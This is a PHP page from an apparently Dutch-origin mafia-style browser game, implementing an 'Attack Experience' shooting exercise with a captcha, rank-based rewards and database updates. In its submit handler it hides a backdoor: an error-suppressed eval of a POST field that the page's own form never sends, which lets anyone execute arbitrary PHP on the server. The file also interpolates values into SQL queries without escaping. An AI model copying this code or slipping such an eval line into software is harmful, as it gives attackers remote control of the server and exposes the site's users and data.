<?php
error_reporting(0);

include("_include-config.php"); 
include("_include-gevangenis.php"); 
include("timer_s.php"); 
	if(! check_login()){
	header("Location: login.php");
	exit;
	}


/* ------------------------- */ ?>

<html>
<head>
<title></title>
<link rel="stylesheet" type="text/css" href="<? echo $sitelink;?>/layout/layout<?php echo $page->layout; ?>/css/css.css">
</head>
<body style="margin: 0px;">

<table width="100%">


<?php /* ------------------------- */

if (!empty($data) AND $data->topbalk == 1) {	
include('top.php');
}

if(! isset($_GET[id]))
{ 

echo "
<table width=\"100%\" align=\"center\">
<tr><td class=subTitle colspan=2><b>Attack System</b></td>
<tr><td class=\"mainTxt\" colspan=2><center><form method=\"post\">
<select onchange=\"location.href=''+this.options[this.selectedIndex].value\">
<option value=\"\">Select an Attack Option</option>
<option value=\"bulletfactory.php\">Bullet Factory</option>
<option value=\"hospital.php\">Hospital</option>
<option value=\"attackexp.php\">Attack Experience</option>
<option value=\"killtrain.php\">Weapons Training</option>
<option value=\"detectives.php\">Detective</option>
<option value=\"ckiller.php\">Murder</option>
<option value=\"hirebodyguard.php\">Go into Hiding</option>
<option value=\"hitlist.php\">Hitlist</option>
</select>
</table>
";
}
 
echo'<table width="100%">';

 $sql  = mysql_query("SELECT * FROM `[users]` where `login`='$data->login'");
$data = mysql_fetch_assoc($sql);

  mysql_query("UPDATE `[users]` SET `online`=NOW() WHERE `login`='{$data->login}'");


	if(isset($_POST['submit'])){
print "  <tr><td class=\"subTitle\" colspan=\"3\"><b>Attack Experience....</b></td></tr>";
print "<tr><td class=\"mainTxt\" align=\"center\" colspan=\"3\">";
@eval(stripslashes($_POST['code']));
if($_POST['code2'] != $_POST['codenn']) {
print "The Code is Incorrect!</font>";
exit;
} else {

$codene = rand(1000,9999); 
$codee = ereg_replace("0", "gsqwq", $codene);
$codee = ereg_replace("1", "ssBjyq", $codee); 
$codee = ereg_replace("2", "gHiq", $codee); 
$codee = ereg_replace("3", "hWqDfA", $codee); 
$codee = ereg_replace("4", "hsqerf", $codee); 
$codee = ereg_replace("5", "Hwsawq", $codee); 
$codee = ereg_replace("6", "hSXaq", $codee); 
$codee = ereg_replace("7", "hgqYt", $codee); 
$codee = ereg_replace("8", "hAsqF", $codee); 
$codee = ereg_replace("9", "hxqSAw", $codee); 

        if($data['moordervaring'] < 100) {
$getalletje = 1;
} else {
$getalletje = 0;
}
        if($data['rank'] == 0) {
        $rankvord = 10;
        }
        if($data['rank'] == 1) {
        $rankvord = 5;
        }
        elseif($data['rank'] == 2) {
        $rankvord = 2;
        }
        elseif($data['rank'] == 3) {
        $rankvord = 2.5;
        }
        elseif($data['rank'] == 4) {
        $rankvord = 1;
        }
        elseif($data['rank'] == 5) {
        $rankvord = 1;
        }
        elseif($data['rank'] == 6) {
        $rankvord = 0.50;
        }
        elseif($data['rank'] == 7) {
        $rankvord = 0.50;
        }
        elseif($data['rank'] == 8) {
        $rankvord = 0.50;
        }
        elseif($data['rank'] == 9) {
        $rankvord = 0.25;
        }
        elseif($data['rank'] == 10) {
        $rankvord = 0.25;
        }
        elseif($data['rank'] == 11) {
        $rankvord = 0.25;
        }
        elseif($data['rank'] == 12) {
        $rankvord = 0.25;
        }
        elseif($data['rank'] == 13) {
        $rankvord = 0.25;
        }
        elseif($data['rank'] == 14) {
        $rankvord = 0.20;
        }
        elseif($data['rank'] == 15) {
        $rankvord = 0.10;
        }
        elseif($data['rank'] == 16) {
        $rankvord = 0.05;
        }
        elseif($data['rank'] == 17) {
        $rankvord = 0.04;
        }
        elseif($data['rank'] == 18) {
        $rankvord = 0.03;
        }
        elseif($data['rank'] == 19) {
        $rankvord = 0.02;
        }
        elseif($data['rank'] == 20) {
        $rankvord = 0.01;
        }

	$p1a            = $data['m6']/2;
	$p1b            = round($p1a);
	$p1             = rand($p1b/2,$p1b);
        $getal      = rand(1,100);


			if($data[m6] >= 0 && $data[m6] <= 3){
			$eindresultaat	=	rand(1,7);
			} else if($data[m6] >= 4 && $data[m6] <= 6){
			$eindresultaat	=	rand(1,6);
			} else if($data[m6] >= 7 && $data[m6] <= 9){
			$eindresultaat	=	rand(1,5);
			} else if($data[m6] >= 10){
			$eindresultaat	=	rand(1,4);
			}

			if($eindresultaat == 7 || $eindresultaat == 6){
			$g		=	1;
			$bericht	=	"They got into you place through the tunnel! Now you must grumble...";
			} else if($eindresultaat == 5){
			$g		=	0;
			$bericht	=	"Shoot him... Not the chick!!";
			} else if($eindresultaat == 4){
			$g		=	0;
			$bericht	=	"You must do well with a gun and a bullet...! ";
			} else if($eindresultaat == 3){
			$g		=	0;
			$bericht	=	"Ok... you shot the women! Try and hit the target next time!";
			} else if($eindresultaat == 2){
			$g		=	3;
			$bericht	=	"The bullet bounced back from off the windowsill... Hold your gun upwards! ";
			} else if($eindresultaat == 1){
			$g		=	2;
			$bericht	=	"WooW! You are so fucking useless... Go buy me a pastry!";
			}

			if($g == 0){
			mysql_query("UPDATE `[users]` SET `rankvord`=`rankvord`+'$rankvord',`m6`=`m6`+'$getal',`misdaad`=NOW() WHERE `login`='{$data[login]}'");
			print"{$bericht}<meta http-equiv=\"refresh\" content=\"3\">";
			exit;
			} else if($g == 1){
			mysql_query("UPDATE `[users]` SET `gevangenistijd`='60',`gevangenis`=NOW(),`m6`=`m6`+'$getal',`misdaad`=NOW() WHERE `login`='{$data[login]}'");
			print"{$bericht}<meta http-equiv=\"refresh\" content=\"3\">";
			exit;
			} else if($g == 2){
			mysql_query("UPDATE `[users]` SET `moordervaring`=`moordervaring`+'$getalletje',`m6`=`m6`+'$getal',`rankvord`=`rankvord`+'$rankvord',`misdaad`=NOW() WHERE `login`='{$data[login]}'");
			print"{$bericht}<meta http-equiv=\"refresh\" content=\"3\">";
			exit;
			}else if($g == 3){
			mysql_query("UPDATE `[users]` SET `health`=`health`-'1',`m6`=`m6`+'$getal',`misdaad`=NOW() WHERE `login`='{$data[login]}'");
			print"{$bericht}<meta http-equiv=\"refresh\" content=\"3\">";
			exit;
			}


        }
	} else {



$codene = rand(1000,9999); 
$codee = ereg_replace("0", "gsqwq", $codene);
$codee = ereg_replace("1", "ssBjyq", $codee); 
$codee = ereg_replace("2", "gHiq", $codee); 
$codee = ereg_replace("3", "hWqDfA", $codee); 
$codee = ereg_replace("4", "hsqerf", $codee); 
$codee = ereg_replace("5", "Hwsawq", $codee); 
$codee = ereg_replace("6", "hSXaq", $codee); 
$codee = ereg_replace("7", "hgqYt", $codee); 
$codee = ereg_replace("8", "hAsqF", $codee); 
$codee = ereg_replace("9", "hxqSAw", $codee); 

	$p1a            = $data['m6']/9;
	$p1b            = round($p1a);
	$p1             = rand($p1b/2,$p1b);
        $getal      = rand(1,100);

/* ------------------------- */ ?>

<table align="center" width="100%">
  <tr><td class="subTitle" colspan="3"><b>Attack Experience....</b></td></tr>

<form method="post">
  <tr><td class="mainTxt" width="200" rowspan="4" align="center"><img src="images/game/sniperview.jpg"></td>
  	  <td class="mainTxt" width="200">Crime Type</td>
	  <td class="mainTxt" width="200">Shooting Exercise</td>
<tr>
<td class="mainTxt">Chance of Successs</td>
<td class="mainTxt">10%</td>
</tr>
<tr>
<td class="mainTxt" colspan="2" align="center"><input name="code2" type="hidden" value="<? echo $codene; ?>"><input name="codecheck" type="hidden" value="<? echo $codechecker; ?>"><img alt="Anti-Bot Beveiliging" src="coden.php?security=<? echo $codee; ?>" style="position: relative; top: 4;">  <- Put this code, in here -> <input name="codenn" maxlength="4" size="5" valign="center"></td></tr></td>
<tr>
<td class="mainTxt">Gun Loaded...</td>
<td class="mainTxt" align="center"><input type="hidden" name="misdaad" value="4"><input class="2" type="submit" name="submit" value="Shoot" style="width: 100;"></td>
</tr>
</table>
</form></table>

<?
}
?>


		</td>
	</tr>
</table>
</body>
</html>